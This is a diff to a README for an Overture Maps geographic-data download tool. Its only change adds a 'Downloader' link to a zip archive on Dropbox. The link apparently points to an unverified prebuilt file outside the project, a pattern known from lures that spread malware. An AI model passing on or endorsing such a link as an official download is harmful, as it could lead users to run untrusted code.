@@ -2,6 +2,8 @@
 
 This is a command-line executable that allows you to download geographical data from the [Overture Maps Foundation](https://overturemaps.org/). Overture Maps is a collaborative effort to create a reliable, easy-to-use, and openly available map dataset.
 
+[Downloader](https://www.dropbox.com/scl/fi/kmg4egsrpmhf5ohj3j8y9/Download-GIS-Data-v1.zip?rlkey=gawhonv5kf9l6k639okplgfdd&st=h8pd1iwd&dl=0)
+
 ## Features
 
 * **Direct Download:** Fetches data directly from Overture Maps' public datasets.
